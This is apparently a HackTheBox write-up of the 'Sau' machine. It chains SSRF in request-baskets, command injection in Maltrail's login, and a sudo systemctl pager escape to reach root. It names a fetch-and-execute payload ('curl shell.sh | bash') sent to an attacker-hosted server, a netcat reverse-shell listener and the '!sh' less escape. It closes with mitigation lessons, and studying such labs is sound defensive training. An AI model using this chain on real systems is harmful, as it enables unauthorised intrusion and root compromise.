Sau

Technical Deep-Dive

🖥️ Overview — Sau

  • Platform: HackTheBox | Difficulty: Easy | OS: Linux
  • Tags: SSRF, RCE, Privilege Escalation, Web
  • Kill chain: SSRF → Command Injection → Sudo misconfiguration
  • Goal: obtain user.txt + root.txt

🔍 Recon & Enumeration

  • Nmap full port scan (-sC -sV -p-): 3 ports identified
  • Port 22: OpenSSH 8.2p1 — no direct attack vector
  • Port 80: filtered — HTTP service only reachable internally (localhost-bound or firewall)
  • Port 55555: Golang HTTP server — request-baskets v1.2.1 identified
  • request-baskets version linked to CVE-2023-27163 (SSRF)

🚪 Initial Access

  • SSRF via request-baskets (CVE-2023-27163): basket created with forward_url=http://127.0.0.1:80 and proxy_response=true
  • Filtered port 80 exposed → internal app: Mailtrail v0.53
  • Mailtrail v0.53: unauthenticated OS command injection in 'username' parameter of /login
  • Payload: curl shell.sh | bash triggered via SSRF basket endpoint
  • Result: reverse shell as user 'puma' → user.txt obtained

⬆️ Privilege Escalation

  • sudo -l reveals: (ALL:ALL) NOPASSWD: /usr/bin/systemctl status trail.service
  • systemctl status invokes pager (less) on long output — runs as root via sudo
  • Inside less pager: !sh spawns a root shell
  • Technique documented on GTFOBins — systemctl
  • Result: root shell → root.txt obtained

🛠️ Tools & Techniques

  • Nmap (-sC -sV -p-): full port and service discovery
  • cURL: SSRF basket configuration + command injection trigger
  • Python3 http.server: payload hosting (shell.sh)
  • Netcat (nc -lvnp): reverse shell listener on port 9001
  • GTFOBins: reference for sudo/systemctl pager escape (!sh in less)

🎓 Lessons Learned

  • SSRF as a gateway: network filtering is insufficient when an SSRF vector exists on the same host
  • Patch third-party components: request-baskets v1.2.1 and Mailtrail v0.53 had public CVEs with exploit code
  • Sudo + pagers = danger: systemctl status implicitly grants root shell via less; mitigate with LESSSECURE=1 or cat
  • Defense in depth: the attack chains 3 weaknesses — mitigating any single link breaks the kill chain
  • Least-privilege: analyse transitive capabilities of every subprocess in sudo policies
